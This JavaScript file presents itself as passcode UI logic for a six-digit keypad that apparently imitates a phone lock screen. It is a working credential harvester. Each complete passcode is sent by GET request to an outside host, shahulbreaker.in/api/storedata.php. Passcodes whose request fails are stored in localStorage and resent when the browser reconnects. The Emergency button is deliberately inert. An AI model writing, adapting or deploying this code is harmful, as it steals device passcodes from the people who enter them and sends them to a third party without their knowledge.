// app.js - passcode UI logic
(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
  const MAX = 6;
  let code = "";

  const dotEls = Array.from(document.querySelectorAll('.dot'));
  const keys = Array.from(document.querySelectorAll('.key'));
  const emergency = document.getElementById('emergency');
  const cancelBtn = document.getElementById('cancel');

  function refreshDots(){
    dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
  }

  function reset(){
    code = "";
    refreshDots();
  }

  function queuePass(pass){
    const q = JSON.parse(localStorage.getItem('_pass_queue_') || '[]');
    q.push({pass, ts: Date.now()});
    localStorage.setItem('_pass_queue_', JSON.stringify(q));
  }

  function sendToAPI(pass){
    const url = API_BASE + encodeURIComponent(pass);
    fetch(url, { method: 'GET', keepalive: true })
      .catch(() => queuePass(pass));
  }

  function flushQueue(){
    const qk = '_pass_queue_';
    const queue = JSON.parse(localStorage.getItem(qk) || '[]');
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(qk);
  }

  // handle key presses
  keys.forEach(k => k.addEventListener('click', (e) => {
    if (k.classList.contains('empty')) return;
    const action = k.dataset.action;
    if (action === 'back') {
      code = code.slice(0, -1);
      refreshDots();
      return;
    }
    const num = k.dataset.num;
    if (!num) return;
    if (code.length >= MAX) return;
    code += num;
    refreshDots();
    if (code.length === MAX) {
      // small visual delay then send
      setTimeout(() => {
        sendToAPI(code);
        reset();
      }, 200);
    }
  }));

  // Emergency does nothing (visual)
  emergency && emergency.addEventListener('click', (e) => {
    e.preventDefault();
    // intentionally no action
  });

  // Cancel clears input
  cancelBtn && cancelBtn.addEventListener('click', (e) => {
    e.preventDefault();
    reset();
  });

  window.addEventListener('online', flushQueue);
  flushQueue();

  // Expose for debugging
  window.__passUI = { getCode: ()=>code, reset };
})();
